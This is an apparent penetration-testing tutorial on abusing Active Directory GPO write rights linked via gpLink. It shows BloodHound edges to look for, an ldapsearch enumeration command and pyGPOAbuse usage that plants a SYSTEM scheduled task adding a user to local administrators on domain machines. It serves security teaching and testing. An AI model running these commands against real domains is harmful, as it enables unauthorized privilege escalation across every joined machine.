**gpLink** is an attribute on Active Directory objects (domains, OUs, sites) that stores references to Group Policy Objects (GPOs) applied to that container. When a GPO is linked to the domain object itself via `gpLink`, it applies to every computer and user in the domain — making it one of the highest-impact targets in AD privilege escalation.

In a typical attack chain, an attacker who gains write permissions over a GPO linked to the domain can push arbitrary commands to all domain-joined machines.

---

## How gpLink Fits into an Attack

The attack path usually looks like this:

1. A user has `WriteDACL`, `GenericWrite`, or `GenericAll` over a GPO
2. That GPO has a `gpLink` to the domain root or a high-value OU
3. The attacker modifies the GPO to execute a malicious scheduled task
4. Group Policy refresh applies the task to affected machines (every ~90 min by default, or forced with `gpupdate /force`)

BloodHound exposes this by showing edges like `GPLink` from the GPO to the domain object, combined with `GenericAll` or `WriteDACL` from the compromised user to the GPO.

---

## Identifying gpLink Abuse Potential

### Via BloodHound

Look for paths where your user has control over a GPO that has a `GPLink` edge pointing to the domain or a populated OU. The key edges to watch are `GenericAll`, `WriteDACL`, `Owns`, and `WriteOwner` on GPO objects.

### Via ldapsearch

```bash
ldapsearch -x -H ldap://192.168.108.97 \
  -D "user@domain" -w 'password' \
  -b "DC=domain,DC=local" \
  "(objectClass=domainDNS)" gpLink
```

The output will show something like:

```
gpLink: [LDAP://cn={31B2F340-016D-11D2-945F-00C04FB984F9},cn=policies,cn=system,DC=secura,DC=yzx;0]
```

The GUID inside `{}` is what you need for exploitation.

---

## Exploitation with pyGPOAbuse

`pyGPOAbuse` abuses write access over a GPO by injecting a malicious immediate scheduled task into the GPO's SYSVOL path. The task runs as SYSTEM on affected machines when Group Policy refreshes.

### Installation

```bash
git clone https://github.com/Hackndo/pyGPOAbuse
cd pyGPOAbuse
pip install -r requirements.txt
```

### Basic Usage — Add User to Local Admins

```bash
python3 pygpoabuse.py <domain>/<user>:<password> \
  -dc-ip <ip> \
  -gpo-id "<gpo-id>" \
  -command "net localgroup administrators <user> /add" \
  -taskname "EvilTask"
```

The target format is `domain/user:password` as a positional argument. Using `-d` causes ambiguity with `-description` and `-dc-ip`.


